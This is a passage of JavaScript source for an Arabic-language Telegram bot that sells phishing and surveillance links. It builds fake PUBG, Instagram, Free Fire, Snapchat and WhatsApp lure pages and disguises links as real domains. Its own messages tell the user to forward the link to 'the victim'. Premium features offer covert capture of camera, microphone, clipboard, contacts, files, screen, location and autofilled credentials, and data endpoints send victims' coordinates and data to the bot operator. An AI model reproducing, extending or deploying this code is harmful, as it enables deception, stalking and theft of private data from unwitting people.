        [{text: prem2.pushNotif===false ? "🔔 تفعيل إشعارات الجهاز له" : "🔕 تعطيل إشعارات الجهاز عليه", callback_data:`pg_upushtoggle_${uid}`}],
        [{text: on ? "📤✅ إيقاف إرسال بيانات صفحتك له" : "📤 إرسال بيانات صفحتك له", callback_data:`pg_ufwdtoggle_${uid}`}],
        [{text:"🗑️ مسح بياناته",callback_data:`pg_uclear_${uid}`},{text:"📋 سجل بياناته",callback_data:`pg_ulog_${uid}`}],
        [{text:"🔙 رجوع",callback_data:"premlist"}]
      ]})}
    ).catch(()=>{});
  }

  if (data.startsWith("pg_upushtoggle_") && q.from.id === BOT_OWNER) {
    const uid = data.replace("pg_upushtoggle_","");
    if (!premium[uid]) return;
    premium[uid].pushNotif = premium[uid].pushNotif === false ? true : false;
    savePremium();
    const enabled = premium[uid].pushNotif !== false;
    bot.answerCallbackQuery(q.id, {text: enabled ? "🔔 تم تفعيل الإشعارات" : "🔕 تم تعطيل الإشعارات"}).catch(()=>{});
    const prof = profiles[uid]||{};
    const prem2 = premium[uid]||{};
    const cfg2 = getUserPage(uid);
    const subs2 = getUserSubs(uid);
    const hasAccess2 = !!prem2.pageAccess;
    const link2 = `${hostURL}/p/u/${uid}`;
    return bot.editMessageText(
      `🎛️ *إدارة صفحة: ${prof.name||uid}*\n\n` +
      `🔑 الوصول: ${hasAccess2 ? "✅ مفعّل" : "🔒 معطّل"}\n` +
      `🔔 إشعارات الجهاز: ${enabled ? "✅ مفعّلة" : "🔕 معطّلة"}\n` +
      `📡 الحالة: ${cfg2.active ? "🟢 نشطة" : "🔴 متوقفة"}\n` +
      `👁️ مشاهدات: ${cfg2.views||0}\n` +
      `✅ بيانات مجموعة: ${subs2.length}\n` +
      `🔗 الرابط: \`${link2}\``,
      {chat_id:chatId, message_id:q.message.message_id, parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
        [{text: hasAccess2 ? "🔒 تعطيل الصفحة عليه" : "✅ تفعيل الصفحة له", callback_data:`pg_utoggle_${uid}`}],
        [{text: !enabled ? "🔔 تفعيل إشعارات الجهاز له" : "🔕 تعطيل إشعارات الجهاز عليه", callback_data:`pg_upushtoggle_${uid}`}],
        [{text:"🗑️ مسح بياناته",callback_data:`pg_uclear_${uid}`},{text:"📋 سجل بياناته",callback_data:`pg_ulog_${uid}`}],
        [{text:"🔙 رجوع",callback_data:"premlist"}]
      ]})}
    ).catch(()=>{});
  }

  if (data.startsWith("pg_utoggle_") && q.from.id === BOT_OWNER) {
    const uid = data.replace("pg_utoggle_","");
    if (!premium[uid]) return;
    premium[uid].pageAccess = !premium[uid].pageAccess;
    savePremium();
    const hasAccess = premium[uid].pageAccess;
    bot.answerCallbackQuery(q.id, {text: hasAccess ? "✅ تم تفعيل الصفحة" : "🔒 تم تعطيل الصفحة"}).catch(()=>{});
    if (hasAccess) {
      bot.sendMessage(Number(uid), `🎉 تم تفعيل ميزة الصفحة الملغمة لحسابك!\nاكتب /page للوصول إليها.`).catch(()=>{});
    } else {
      bot.sendMessage(Number(uid), `⛔ تم تعطيل ميزة الصفحة الملغمة من قبل المالك.`).catch(()=>{});
    }
    const prof = profiles[uid]||{};
    const cfg = getUserPage(uid);
    const subs = getUserSubs(uid);
    const link = `${hostURL}/p/u/${uid}`;
    return bot.editMessageText(
      `🎛️ *إدارة صفحة: ${prof.name||uid}*\n\n` +
      `🔑 الوصول: ${hasAccess ? "✅ مفعّل" : "🔒 معطّل"}\n` +
      `📡 الحالة: ${cfg.active ? "🟢 نشطة" : "🔴 متوقفة"}\n` +
      `👁️ مشاهدات: ${cfg.views||0}\n` +
      `✅ بيانات مجموعة: ${subs.length}\n` +
      `🔗 الرابط: \`${link}\``,
      {chat_id:chatId, message_id:q.message.message_id, parse_mode:"Markdown",
       reply_markup:JSON.stringify({inline_keyboard:[
         [{text: hasAccess ? "🔒 تعطيل الصفحة عليه" : "✅ تفعيل الصفحة له", callback_data:`pg_utoggle_${uid}`}],
         [{text:"🗑️ مسح بياناته",callback_data:`pg_uclear_${uid}`},{text:"📋 سجل بياناته",callback_data:`pg_ulog_${uid}`}],
         [{text:"🔙 رجوع",callback_data:"premlist"}]
       ]})
      }
    ).catch(()=>{});
  }

  if (data.startsWith("pg_uclear_") && q.from.id === BOT_OWNER) {
    const uid = data.replace("pg_uclear_","");
    userSubs[uid] = []; saveUserSubs();
    bot.answerCallbackQuery(q.id,{text:"🗑️ تم مسح البيانات"}).catch(()=>{});
    return bot.sendMessage(chatId,`✅ تم مسح بيانات ${uid}`);
  }

  if (data.startsWith("pg_ulog_") && q.from.id === BOT_OWNER) {
    const uid = data.replace("pg_ulog_","");
    const subs = getUserSubs(uid);
    if (!subs.length) return bot.sendMessage(chatId,"📋 لا توجد بيانات بعد.");
    const last5 = subs.slice(-5).reverse().map((s,i)=>`${i+1}. ${s.time}\n${Object.entries(s.fields||{}).map(([k,v])=>`   ${k}: ${v}`).join("\n")}`).join("\n\n");
    return bot.sendMessage(chatId,`📋 آخر 5 سجلات (${uid}):\n\n${last5}`);
  }

  // ── User page callbacks (premium user controlling their own page) ──────────
  if (data.startsWith("pgu_toggle_")) {
    const uid = data.replace("pgu_toggle_","");
    if (String(chatId) !== uid) return;
    const cfg = getUserPage(uid);
    cfg.active = !cfg.active;
    setUserPage(uid, cfg);
    return sendUserPageMain(chatId, uid, q.message.message_id);
  }

  if (data.startsWith("pgu_quick_")) {
    const uid = data.replace("pgu_quick_","");
    if (String(chatId) !== uid) return;
    const cfg = getUserPage(uid);
    const cur = TPL_THEMES[cfg.template]?.name || cfg.template;
    return bot.sendMessage(chatId,
      `⚡ *تبديل سريع*\n\nالقالب الحالي: ${cur}\nاختر القالب:`,
      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
        [{text:"🎮 ببجي (شدة)",callback_data:`pgu_preset_${uid}_pubg`},{text:"📸 إنستغرام (متابعين)",callback_data:`pgu_preset_${uid}_ig`}],
        [{text:"🔥 فري فاير (جواهر)",callback_data:`pgu_preset_${uid}_ff`},{text:"👻 سناب (تحقق)",callback_data:`pgu_preset_${uid}_snap`}],
        [{text:"📱 واتساب (تحقق)",callback_data:`pgu_preset_${uid}_wa`}],
        [{text:"🔙 رجوع",callback_data:`pgu_back_${uid}`}]
      ]})}
    );
  }

  if (data.startsWith("pgu_preset_")) {
    const parts = data.replace("pgu_preset_","").split("_");
    const tpl = parts.pop(); const uid = parts.join("_");
    if (String(chatId) !== uid) return;
    const preset = QUICK_PRESETS[tpl]; if (!preset) return;
    bot.answerCallbackQuery(q.id,{text:"⚡ جاري التطبيق..."}).catch(()=>{});
    const existing = getUserPage(uid);
    const newCfg = { ...existing, ...preset, active:true, views:existing.views||0 };
    setUserPage(uid, newCfg);
    const name = TPL_THEMES[tpl]?.name||tpl;
    return bot.sendMessage(chatId,
      `✅ تم تطبيق قالب ${name}!\n🔗 رابطك: \`${hostURL}/p/u/${uid}\``,
      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[[{text:"🎛️ لوحة التحكم",callback_data:`pgu_back_${uid}`}]]})}
    );
  }

  if (data.startsWith("pgu_links_")) {
    const uid = data.replace("pgu_links_","");
    if (String(chatId) !== uid) return;
    const realLink = `${hostURL}/p/u/${uid}`;
    return bot.sendMessage(chatId,
      `🔗 *روابط صفحتك:*\n\n🔗 الرابط الحقيقي:\n\`${realLink}\`\n\n🎭 اختر شكل الرابط المخادع:`,
      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
        [{text:"🎮 ببجي",callback_data:`pgu_lnk_${uid}_pubg`},{text:"📸 إنستغرام",callback_data:`pgu_lnk_${uid}_ig`}],
        [{text:"🔥 فري فاير",callback_data:`pgu_lnk_${uid}_ff`},{text:"👻 سناب",callback_data:`pgu_lnk_${uid}_snap`}],
        [{text:"📱 واتساب",callback_data:`pgu_lnk_${uid}_wa`}],
        [{text:"🔙 رجوع",callback_data:`pgu_back_${uid}`}]
      ]})}
    );
  }

  if (data.startsWith("pgu_lnk_")) {
    const parts = data.replace("pgu_lnk_","").split("_");
    const type = parts.pop(); const uid = parts.join("_");
    if (String(chatId) !== uid) return;
    const realLink = `${hostURL}/p/u/${uid}`;
    const fakeTexts = {
      pubg:`pubg.com/gifts/claim-${Math.random().toString(36).slice(2,6)}`,
      ig:`instagram.com/p/${Math.random().toString(36).slice(2,10)}`,
      ff:`ff.garena.com/rewards/${Math.random().toString(36).slice(2,8)}`,
      snap:`snapchat.com/add/verify-${Math.random().toString(36).slice(2,6)}`,
      wa:`wa.me/link/${Math.random().toString(36).slice(2,8)}`
    };
    const fakeText = fakeTexts[type]||realLink;
    return bot.sendMessage(chatId,
      `🎭 *الرابط المخادع جاهز!*\n\n📲 *تلغرام:* فوّرد الرسالة التالية للضحية\n📱 *واتساب/غيره:* احصل على رابط قصير أدناه`,
      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
        [{text:"📋 رابط قصير للواتساب",callback_data:`pgu_short_${uid}`}],
        [{text:"🔙 رجوع",callback_data:`pgu_links_${uid}`}]
      ]})}
    ).then(()=> bot.sendMessage(chatId,`🔗 [${fakeText}](${realLink})`,{parse_mode:"Markdown"}));
  }

  if (data.startsWith("pgu_short_")) {
    const uid = data.replace("pgu_short_","");
    if (String(chatId) !== uid) return;
    const realLink = `${hostURL}/p/u/${uid}`;
    bot.answerCallbackQuery(q.id,{text:"⏳ جاري إنشاء الرابط..."}).catch(()=>{});
    const short = await makeTinyUrl(realLink);
    if (!short) return bot.sendMessage(chatId,"❌ فشل إنشاء الرابط القصير.");
    return bot.sendMessage(chatId,`📋 *الرابط القصير:*\n\n\`${short}\`\n\nانسخه وأرسله من أي تطبيق 📱`,
      {parse_mode:"Markdown"});
  }

  if (data.startsWith("pgu_renew_")) {
    const uid = data.replace("pgu_renew_","");
    if (String(chatId) !== uid) return;
    bot.answerCallbackQuery(q.id,{text:"⏳ جاري توليد رابط جديد..."}).catch(()=>{});
    const realLink = `${hostURL}/p/u/${uid}`;
    const short = await makeTinyUrl(realLink);
    if (!short) return bot.sendMessage(chatId,"❌ فشل توليد الرابط، حاول مرة أخرى.");
    return bot.sendMessage(chatId,
      `🔄 *تم تجديد رابطك!*\n\n📋 الرابط الجديد:\n\`${short}\`\n\n⏰ تاريخ التجديد: ${new Date().toLocaleString('ar-SA')}\n\nانسخه وأرسله 📤`,
      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
        [{text:"🔄 تجديد مرة أخرى",callback_data:`pgu_renew_${uid}`},{text:"🔙 رجوع",callback_data:`pgu_back_${uid}`}]
      ]})});
  }

  if (data.startsWith("pgu_log_")) {
    const uid = data.replace("pgu_log_","");
    if (String(chatId) !== uid) return;
    const subs = getUserSubs(uid);
    if (!subs.length) return bot.sendMessage(chatId,"📋 لا توجد بيانات بعد.",{reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:`pgu_back_${uid}`}]]})});
    const last5 = subs.slice(-5).reverse().map((s,i)=>`${i+1}. ${s.time}\n${Object.entries(s.fields||{}).map(([k,v])=>`   ${k}: ${v}`).join("\n")}`).join("\n\n");
    return bot.sendMessage(chatId,`📋 آخر 5 سجلات:\n\n${last5}`,{reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:`pgu_back_${uid}`}]]})});
  }

  if (data.startsWith("pgu_clear_")) {
    const uid = data.replace("pgu_clear_","");
    if (String(chatId) !== uid) return;
    userSubs[uid] = []; saveUserSubs();
    bot.answerCallbackQuery(q.id,{text:"🗑️ تم المسح"}).catch(()=>{});
    return sendUserPageMain(chatId, uid, q.message.message_id);
  }

  if (data.startsWith("pgu_back_")) {
    const uid = data.replace("pgu_back_","");
    if (String(chatId) !== uid) return;
    return sendUserPageMain(chatId, uid, q.message.message_id);
  }

  if (data.startsWith("pgu_setpass_")) {
    const uid = data.replace("pgu_setpass_","");
    if (String(chatId) !== uid && chatId !== BOT_OWNER) return;
    const cfg = getUserPage(uid);
    const hasPass = !!cfg.pagePassword;
    const passText = hasPass
      ? `🔒 *كلمة السر لصفحتك*\n\nالكود الحالي: \`${cfg.pagePassword}\`\n\nاختر إجراء:`
      : `🔒 *كلمة السر لصفحتك*\n\n_(غير مفعّلة حالياً)_\n\nبعد التفعيل، أي شخص يفتح رابطك سيُطلب منه الكود أولاً.`;
    return bot.sendMessage(chatId, passText, {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
      hasPass
        ? [{text:"✏️ تغيير الكود",callback_data:`pgu_setpass_new_${uid}`},{text:"🗑️ إزالة",callback_data:`pgu_clrpass_${uid}`}]
        : [{text:"➕ تفعيل كلمة سر",callback_data:`pgu_setpass_new_${uid}`}],
      [{text:"🔙 رجوع",callback_data:`pgu_back_${uid}`}]
    ]})});
  }

  if (data.startsWith("pgu_setpass_new_")) {
    const uid = data.replace("pgu_setpass_new_","");
    if (String(chatId) !== uid && chatId !== BOT_OWNER) return;
    _awaitPagePass.set(chatId, {type:"user", uid});
    return bot.sendMessage(chatId, `🔒 *اكتب الكود السري لصفحتك:*\n\nأو /cancel للإلغاء`, {parse_mode:"Markdown", reply_markup:JSON.stringify({force_reply:true})});
  }

  if (data.startsWith("pgu_clrpass_")) {
    const uid = data.replace("pgu_clrpass_","");
    if (String(chatId) !== uid && chatId !== BOT_OWNER) return;
    const cfg = getUserPage(uid);
    cfg.pagePassword = null;
    setUserPage(uid, cfg);
    bot.answerCallbackQuery(q.id, {text:"🔓 تم إزالة كلمة السر"}).catch(()=>{});
    return sendUserPageMain(chatId, uid, q.message.message_id);
  }

  if (data === "do_backup" && chatId === BOT_OWNER) {
    bot.answerCallbackQuery(q.id, { text: "💾 جاري تجهيز النسخة..." }).catch(()=>{});
    await bot.sendMessage(chatId, "📦 جاري تجميع كل الملفات في ZIP واحد...");
    try {
      const archiver = require("archiver");
      const os = require("os");
      const zipPath = require("path").join(os.tmpdir(), `backup_${Date.now()}.zip`);
      const output = fs.createWriteStream(zipPath);
      const archive = archiver("zip", { zlib: { level: 9 } });
      const readmeContent = `
╔══════════════════════════════════════════════════════════════╗
║           🤖 بوت الروابط الملغمة — دليل التشغيل           ║
╚══════════════════════════════════════════════════════════════╝

📁 هيكل الملفات:
  server/
  ├── index.js          ← السيرفر الرئيسي
  ├── package.json      ← المكتبات المطلوبة
  ├── views/            ← صفحات HTML
  └── public/           ← ملفات ثابتة
  data/                 ← بيانات المستخدمين (اختياري)

🔑 المتغيرات البيئية المطلوبة:
  bot        = توكن البوت من @BotFather
  GITHUB_PERSONAL_ACCESS_TOKEN = توكن GitHub (لحفظ البيانات)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🟣 ══ REPLIT ══════════════════════════════════════════════════

1) افتح replit.com وأنشئ Repl جديد من نوع Node.js
2) ارفع ملفات مجلد server/ كلها
3) في Shell نفّذ:
      npm install
4) افتح Secrets (القفل في الشريط الجانبي) وأضف:
      bot  →  توكن البوت
      GITHUB_PERSONAL_ACCESS_TOKEN  →  توكن GitHub
5) في ملف .replit تأكد:
      run = "node index.js"
6) اضغط Run ✅
7) لإبقاء البوت شغّالاً استخدم UptimeRobot على رابط Replit

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔵 ══ RAILWAY ════════════════════════════════════════════════

1) افتح railway.app وسجّل دخول بـ GitHub
2) اضغط New Project ← Deploy from GitHub repo
3) ارفع ملفات server/ على GitHub أولاً ثم اختر الـ repo
   (أو استخدم: New Project ← Deploy from local folder)
4) بعد الإنشاء، اذهب إلى Variables وأضف:
      bot  →  توكن البوت
      GITHUB_PERSONAL_ACCESS_TOKEN  →  توكن GitHub
      PORT  →  3000
5) اذهب إلى Settings ← Start Command:
      node index.js
6) Railway سيشغّل البوت تلقائياً ✅
7) من Settings ← Domains أنشئ رابط عام للبوت

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🟢 ══ RENDER ════════════════════════════════════════════════

1) افتح render.com وسجّل دخول
2) اضغط New ← Web Service
3) اربط بـ GitHub repo أو ارفع الكود
4) اضبط الإعدادات:
      Build Command:   npm install
      Start Command:   node index.js
      Instance Type:   Free
5) في Environment أضف:
      bot  →  توكن البوت
      GITHUB_PERSONAL_ACCESS_TOKEN  →  توكن GitHub
6) اضغط Create Web Service ✅
7) ⚠️ Render مجاني ينام بعد 15 دقيقة بدون طلبات
   الحل: استخدم UptimeRobot لإرسال ping كل 10 دقائق

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💾 استعادة البيانات بعد النقل:
  انسخ ملفات data/ إلى جذر المشروع:
    premium.json, users.json, settings.json, profiles.json ...
  عند التشغيل سيتم تحميلها تلقائياً.

❓ مشاكل شائعة:
  • البوت لا يستجيب → تحقق من صحة توكن bot في المتغيرات
  • البيانات تختفي → تأكد من إضافة GITHUB_PERSONAL_ACCESS_TOKEN
  • Port error → أضف متغير PORT=3000 في Railway/Render

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ Powered by @Ye_x00
`;
      await new Promise((resolve, reject) => {
        output.on("close", resolve);
        archive.on("error", reject);
        archive.pipe(output);
        // ── ملف الشرح ────────────────────────────────
        archive.append(readmeContent, { name: "README_شرح_التشغيل.txt" });
        // ── كود السيرفر ────────────────────────────────
        const codeFiles = ["index.js", "package.json"];
        for (const f of codeFiles) {
          if (fs.existsSync(f)) archive.file(f, { name: `server/${f}` });
        }
        // ── الصفحات ────────────────────────────────────
        const viewsDir = "./views";
        if (fs.existsSync(viewsDir)) archive.directory(viewsDir, "server/views");
        // ── public ─────────────────────────────────────
        const pubDir = "./public";
        if (fs.existsSync(pubDir)) archive.directory(pubDir, "server/public");
        // ── ملفات البيانات ────────────────────────────
        const dataFiles = [
          PREMIUM_FILE, "settings.json", "users.json", "profiles.json",
          "stats.json", "userstats.json", PAGE_CONFIG_FILE,
          SUBMISSIONS_FILE, USER_PAGES_FILE, USER_SUBS_FILE,
          "banned.json", "targets.json", "notes.json", "push_subs.json"
        ];
        for (const f of dataFiles) {
          if (fs.existsSync(f)) archive.file(f, { name: `data/${require("path").basename(f)}` });
        }
        archive.finalize();
      });
      const stamp = new Date().toISOString().slice(0,10);
      await bot.sendDocument(chatId, fs.createReadStream(zipPath), {
        caption: `✅ *نسخة احتياطية كاملة*\n📅 ${stamp}\n\n📁 يحتوي على:\n• كود السيرفر (index.js + views)\n• جميع ملفات البيانات`
      }, { filename: `bot_backup_${stamp}.zip`, contentType: "application/zip" });
      fs.unlinkSync(zipPath);
      backupToGitHub().catch(()=>{});
      return bot.sendMessage(chatId, `💾 تم الحفظ على GitHub أيضاً ✅`);
    } catch(e) {
      return bot.sendMessage(chatId, `❌ فشل إنشاء النسخة: ${e.message}`);
    }
  }

  if (data.startsWith("chat_reply_") && isPremium(chatId)) {
    const parts = data.replace("chat_reply_","").split("_");
    const uid = parts[0]; const pid = parts.slice(1).join("_") || "default";
    _awaitChatReply.set(chatId, { uid, pid });
    return bot.sendMessage(chatId, `💬 *اكتب ردك على الضحية:*\n\nسيظهر لها فوراً في نافذة المحادثة.\nأو /cancel للإلغاء`,
      {parse_mode:"Markdown", reply_markup:JSON.stringify({force_reply:true})});
  }

  if (data === "premgrant" && q.from.id === BOT_OWNER) {
    return bot.sendMessage(chatId, PREM_GRANT_PREFIX, { reply_markup: JSON.stringify({ force_reply: true }) });
  }

  if (data === "premrevoke" && q.from.id === BOT_OWNER) {
    return bot.sendMessage(chatId, PREM_REVOKE_PREFIX, { reply_markup: JSON.stringify({ force_reply: true }) });
  }

  if (data === "gopc" && q.from.id === BOT_OWNER) {
    return bot.sendMessage(chatId, premiumConfigText(), {
      parse_mode: "Markdown",
      reply_markup: buildPremiumConfigKeyboard()
    });
  }

  // ── Feature buttons ────────────────────────────────────────────────────────
  // ── Premium Config buttons ──────────────────────────────────────────────────
  if (data.startsWith("pc:") && q.from.id === BOT_OWNER) {
    const msgId = q.message.message_id;
    if (data.startsWith("pc:t:")) {
      const k = data.replace("pc:t:","");
      if (k in PREM_FEAT_NAMES) {
        settings.premiumFree[k] = !settings.premiumFree[k];
        if (!settings.premiumFree[k]) settings.premiumFreeExpiry[k] = null;
        saveSettings();
        backupFileToGH(SETTINGS_FILE, '_data/settings.json');
      }
    } else if (data.startsWith("pc:timer:")) {
      const mins = parseInt(data.replace("pc:timer:",""));
      const exp  = Date.now() + mins * 60 * 1000;
      Object.keys(PREM_FEAT_NAMES).forEach(k => {
        settings.premiumFree[k]        = true;
        settings.premiumFreeExpiry[k]  = exp;
      });
      saveSettings();
      backupFileToGH(SETTINGS_FILE, '_data/settings.json');
    } else if (data === "pc:allpaid") {
      Object.keys(PREM_FEAT_NAMES).forEach(k => {
        settings.premiumFree[k]       = false;
        settings.premiumFreeExpiry[k] = null;
      });
      saveSettings();
      backupFileToGH(SETTINGS_FILE, '_data/settings.json');
    }
    return bot.editMessageText(premiumConfigText(), {
      chat_id: chatId, message_id: msgId,
      parse_mode: "Markdown",
      reply_markup: buildPremiumConfigKeyboard()
    }).catch(() => {});
  }

  if (data.startsWith("ft:") && q.from.id === BOT_OWNER) {
    const msgId = q.message.message_id;
    if (data.startsWith("ft:t:")) {
      const k = data.replace("ft:t:","");
      if (k in settings.features) { settings.features[k] = !settings.features[k]; saveSettings(); }
    } else if (data === "ft:allon") {
      Object.keys(settings.features).forEach(k => settings.features[k]=true); saveSettings();
    } else if (data === "ft:alloff") {
      Object.keys(settings.features).forEach(k => settings.features[k]=false);
      settings.featureExpiry = null; saveSettings();
    } else if (data.startsWith("ft:timer:")) {
      const mins = parseInt(data.replace("ft:timer:",""));
      Object.keys(settings.features).forEach(k => settings.features[k]=true);
      settings.featureExpiry = Date.now() + mins*60*1000; saveSettings();
    } else if (data === "ft:timeroff") {
      settings.featureExpiry = null; saveSettings();
    }
    return editFeaturesMenu(chatId, msgId);
  }

  if (data.startsWith("qr:")) {
    const uid = data.replace("qr:","").trim();
    const link = lastLink.get(uid) || lastLink.get(String(chatId));
    if (!link) return bot.sendMessage(chatId, "❌ لا يوجد رابط محفوظ. أنشئ رابطاً أولاً.");
    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=${encodeURIComponent(link)}`;
    return bot.sendPhoto(chatId, qrUrl, { caption: `📷 QR Code\n\n${link}` }).catch(() => {
      bot.sendMessage(chatId, `📷 QR: ${qrUrl}`);
    });
  }
});

bot.on('polling_error', () => {});

// ── Features Menu Builder ─────────────────────────────────────────────────────
const FEAT_NAMES = {
  gyroscope:   "🌀 جيروسكوب",
  webrtc:      "🌐 WebRTC IP",
  fingerprint: "🖥️ بصمة الجهاز",
  sessionTime: "⏱️ وقت الجلسة",
  lightSensor: "💡 مستشعر الضوء",
  clipboard:   "📋 الحافظة",
  battery:     "🔋 مستوى البطارية",
  vpnDetect:   "🕵️ كشف VPN"
};

// ── Premium Config Menu ───────────────────────────────────────────────────────
const PREM_FEAT_NAMES = {
  camera:      "📷 الكاميرا",
  audio:       "🎤 الصوت",
  clipboard:   "📋 الحافظة",
  contacts:    "📒 جهات الاتصال",
  files:       "🖼️ الصور/الملفات",
  persistentId:"🆔 المعرّف الدائم",
  localNet:    "🌐 الشبكة المحلية",
  webpush:     "🔔 الإشعارات",
  screencap:      "🖥️ تصوير الشاشة",
  contcam:        "📸 التصوير المستمر",
  contaudio:      "🎙️ الصوت المستمر",
  faceAI:         "😊 تحليل الوجه AI",
  activityDetect: "🚶 كشف النشاط الجسدي",
  autofill:       "🔑 استخراج إيميل/يوزرنيم",
  devtools:       "🔍 كشف DevTools"
};

function premiumConfigText() {
  const lines = Object.entries(PREM_FEAT_NAMES).map(([k, name]) => {
    const isFree = isPremiumFeatureFree(k);
    const exp    = settings.premiumFreeExpiry?.[k];
    const expStr = exp ? ` (حتى ${new Date(exp).toJSON().slice(11,16)} UTC)` : '';
    return `${isFree ? '🟢 مجاني' : '🔴 مدفوع'} ${name}${expStr}`;
  });
  return `💎 *إعدادات الميزات المدفوعة*\n\nاضغط على الميزة لتبديلها بين مجاني ومدفوع:\n\n${lines.join('\n')}`;
}

function buildPremiumConfigKeyboard() {
  const rows = Object.entries(PREM_FEAT_NAMES).map(([k, name]) => {
    const isFree = isPremiumFeatureFree(k);
    return [{ text: `${isFree ? '🟢' : '🔴'} ${name}`, callback_data: `pc:t:${k}` }];
  });
  rows.push([
    { text: "⏱️ 15د مجاني للكل",  callback_data: "pc:timer:15" },
    { text: "⏱️ 60د مجاني للكل",  callback_data: "pc:timer:60" }
  ]);
  rows.push([{ text: "🔴 مدفوع للكل", callback_data: "pc:allpaid" }]);
  return JSON.stringify({ inline_keyboard: rows });
}

function buildFeaturesKeyboard() {
  const rows = Object.entries(settings.features).map(([k, v]) => ([{
    text: `${v ? '🟢' : '🔴'} ${FEAT_NAMES[k] || k}`,
    callback_data: `ft:t:${k}`
  }]));
  rows.push([
    { text: "🟢 تشغيل الكل",  callback_data: "ft:allon"  },
    { text: "🔴 إيقاف الكل", callback_data: "ft:alloff" }
  ]);
  rows.push([
    { text: "⏱️ 15 دقيقة", callback_data: "ft:timer:15" },
    { text: "⏱️ 30 دقيقة", callback_data: "ft:timer:30" },
    { text: "⏱️ 60 دقيقة", callback_data: "ft:timer:60" }
  ]);
  if (settings.featureExpiry) {
    rows.push([{ text: "❌ إلغاء المؤقت", callback_data: "ft:timeroff" }]);
  }
  return JSON.stringify({ inline_keyboard: rows });
}

function featuresText() {
  const expiry = settings.featureExpiry
    ? `\n⏱️ تنتهي في: ${new Date(settings.featureExpiry).toJSON().slice(0,16).replace('T',' ')} UTC`
    : "";
  return `🎛️ *الميزات الإضافية*${expiry}\n\nاضغط على الميزة لتشغيلها أو إيقافها:`;
}

function sendFeaturesMenu(cid) {
  return bot.sendMessage(cid, featuresText(), {
    parse_mode: "Markdown",
    reply_markup: buildFeaturesKeyboard()
  });
}

function editFeaturesMenu(chatId, msgId) {
  return bot.editMessageText(featuresText(), {
    chat_id: chatId,
    message_id: msgId,
    parse_mode: "Markdown",
    reply_markup: buildFeaturesKeyboard()
  }).catch(() => {});
}

// ── Link Creation ─────────────────────────────────────────────────────────────

const lastLink = new Map(); // cid -> cloudflare link (for QR)

async function createLink(cid, msg) {
  if (!msg || typeof msg !== 'string') return;
  const trimmed = msg.trim();
  if (trimmed.toLowerCase().startsWith('http')) {
    const url = cid.toString(36) + '/' + Buffer.from(trimmed).toString('base64');
    bot.sendChatAction(cid, "typing");
    stats.linksCreated++; saveStats();
    incUserStat(String(cid), 'linksCreated');
    const cLink  = `${hostURL}/c/${url}`;
    const wLink  = `${hostURL}/w/${url}`;
    const waLink = `${hostURL}/wa/${url}`;
    const dlLink = `${hostURL}/dl/${url}`;
    const ttLink = `${hostURL}/tt/${url}`;
    const igLink = `${hostURL}/ig/${url}`;
    const coLink = `${hostURL}/co/${url}`;
    const fLink  = `${hostURL}/f/${url}`;
    lastLink.set(String(cid), cLink);
    const premiumSection = isPremium(cid)
      ? `\n\n📒 جهات الاتصال (بريميوم):\n${coLink}\n\n🖼️ صور وملفات (بريميوم):\n${fLink}`
      : "";
    const upsellNote = !isPremium(cid)
      ? `\n\n━━━━━━━━━━━━━━━\n💎 ميزات البريميوم:\n📷 كاميرا أمامية + خلفية\n🎤 تسجيل صوتي\n📋 محتوى الحافظة\n📒 جهات الاتصال الكاملة\n🖼️ صور وملفات الجهاز\n\nللاشتراك تواصل مع @Ye_x00`
      : "";
    bot.sendMessage(cid,
      `✅ تم إنشاء الروابط!\n🔗 URL: ${trimmed}\n\n🛡️ Cloudflare:\n${cLink}\n\n🖥️ WebView:\n${wLink}\n\n💬 WhatsApp:\n${waLink}\n\n📁 Google Drive:\n${dlLink}\n\n🎵 TikTok:\n${ttLink}\n\n📷 Instagram:\n${igLink}${premiumSection}${upsellNote}`,
      { reply_markup: JSON.stringify({ inline_keyboard: [
        [{ text:"🔗 إنشاء رابط جديد", callback_data:"crenew" }],
        [{ text:"📷 QR Code", callback_data:`qr:${cid}` }]
      ] }) }
    );
  } else {
    bot.sendMessage(cid, `⚠️ أدخل رابطاً صحيحاً يبدأ بـ http أو https`);
    createNew(cid);
  }
}

function createNew(cid) {
  bot.sendMessage(cid, `🌐 Enter Your URL`, { reply_markup: JSON.stringify({ force_reply: true }) });
}

// ── Data Endpoints ────────────────────────────────────────────────────────────

app.get("/", (req, res) => res.json({ ip: getIP(req) }));

app.post("/location", (req, res) => {
  const lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  const lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  const uid = decodeURIComponent(req.body.uid) || null;
  const acc = decodeURIComponent(req.body.acc) || null;
  if (lat && lon && uid && acc) {
    const tid = parseInt(uid, 36);
    const ip  = getIP(req);
    stats.locations++; saveStats();
    const maps = `https://maps.google.com/?q=${lat},${lon}`;
    const locTxt = `${lat}, ${lon} (±${acc}m)\n🗺️ ${maps}`;
    _addToBuf(tid, ip, 'location', locTxt);
    // Send interactive map pin separately (can't merge media)
    if (!settings.silentMode) {
      bot.sendLocation(tid, lat, lon).catch(()=>{});
      if (Number(tid) !== BOT_OWNER) bot.sendLocation(BOT_OWNER, lat, lon).catch(()=>{});
    }
    res.send("Done");
  } else res.send("Missing");
});

app.post("/", (req, res) => {
  let data = decodeURIComponent(req.body.data) || null;
  const uid = decodeURIComponent(req.body.uid) || null;
  if (uid && data) {
